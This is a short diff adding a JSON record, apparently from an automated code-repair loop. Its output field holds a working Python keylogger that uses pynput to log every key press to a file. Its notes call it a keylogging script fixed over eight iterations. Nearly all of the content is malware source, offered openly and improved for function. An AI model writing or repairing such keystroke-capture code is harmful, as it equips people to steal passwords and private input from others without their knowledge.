@@ -1,0 +1,8 @@
+{
+  "output": "import os\nimport time\nfrom pynput import keyboard\n\nlog_dir = os.path.join(os.getcwd(), 'keylogs.txt')\n\ndef on_press(key):\n    with open(log_dir, 'a+') as f:\n        f.write(str(key) + '\\n')\n\ndef on_release(key):\n    return\n\ndef write_to_file(txt):\n    with open('keylogs.txt', 'a+') as f:\n        f.write(txt)\n\nprint('Starting keylogger now...')\nwith keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Keylogging script fixed by properly joining file path and using the correct code for logging key events.",
+  "applied_fixes": [
+    "major_iteration7_issue1"
+  ],
+  "iterations": 8
+}
